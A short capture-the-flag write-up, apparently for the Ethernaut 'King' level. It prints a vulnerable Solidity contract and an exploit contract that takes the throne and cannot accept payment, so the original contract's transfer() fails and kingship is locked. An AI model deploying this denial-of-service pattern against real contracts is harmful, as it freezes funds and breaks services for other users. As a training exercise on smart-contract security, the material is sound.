## 9. King

Goal for this exercise is:

- Block kingship claiming


<br/>

Here is the contract code:
~~~
pragma solidity ^0.6.0;

contract King {

  address payable king;
  uint public prize;
  address payable public owner;

  constructor() public payable {
    owner = msg.sender;  
    king = msg.sender;
    prize = msg.value;
  }

  fallback() external payable {
    require(msg.value >= prize || msg.sender == owner);
    king.transfer(msg.value);
    king = msg.sender;
    prize = msg.value;
  }

  function _king() public view returns (address payable) {
    return king;
  }
}
~~~
<br>
Important was to notice use of `transfer()` which we can make to fail. 

Here is the code to solve this:

~~~
pragma solidity ^0.6.0;


contract KingExploit {

    constructor() public payable {
      }
      
    function sendKing(address payable kingContract) external {
        (bool success, bytes memory response) = kingContract.call{value: address(this).balance, gas:800000}("");
        require(success, "Transfer was not successful.");
    }
    
}
~~~
